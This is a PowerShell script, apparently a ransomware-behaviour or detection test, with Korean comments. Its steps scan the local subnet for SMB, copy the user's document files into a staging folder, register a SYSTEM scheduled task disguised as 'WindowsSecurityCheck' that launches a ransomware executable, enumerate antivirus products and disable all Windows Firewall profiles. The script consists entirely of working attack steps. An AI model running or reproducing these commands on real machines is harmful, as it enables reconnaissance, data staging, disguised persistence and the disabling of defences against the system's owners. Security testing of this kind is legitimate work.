# gemini_ransom_test.ps1
$logFile = "C:\Temp\ps_execution_log.txt"
"[*] PowerShell Multi-Action Script Started" | Out-File $logFile

# Action 1: 내부 네트워크 정찰 (포트 스캔)
"1. Scanning for local SMB shares..." | Out-File $logFile -Append
1..20 | ForEach-Object { 
    $ip = "192.168.0.$_" # 환경에 맞춰 변경 가능
    if (Test-NetConnection -ComputerName $ip -Port 445 -WarningAction SilentlyContinue | Select-Object -ExpandProperty TcpTestSucceeded) {
        "[+] Found active SMB on $ip" | Out-File $logFile -Append
    }
}

# Action 2: 민감 데이터 스테이징 (문서 파일 검색 및 복사)
"2. Staging sensitive documents..." | Out-File $logFile -Append
$stageDir = "C:\Temp\Staging"
if (!(Test-Path $stageDir)) { New-Item -ItemType Directory -Path $stageDir }
Get-ChildItem -Path "$env:USERPROFILE\Documents" -Include "*.pdf","*.docx","*.txt" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $stageDir -Force

# Action 3: 작업 스케줄러를 통한 지속성 확보
"3. Registering scheduled task..." | Out-File $logFile -Append
$action = New-ScheduledTaskAction -Execute "C:\Temp\yara_sample_ransomware_claude.exe"
$trigger = New-ScheduledTaskTrigger -Daily -At 12:00PM
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsSecurityCheck" -User "SYSTEM" -Force

# Action 4: WMI를 통한 보안 제품 탐색
"4. Enumerating security products via WMI..." | Out-File $logFile -Append
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, productState | Out-File $logFile -Append

# Action 5: 윈도우 방화벽 프로필 무력화
"5. Disabling Windows Firewall..." | Out-File $logFile -Append
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

"[*] All PowerShell actions completed." | Out-File $logFile -Append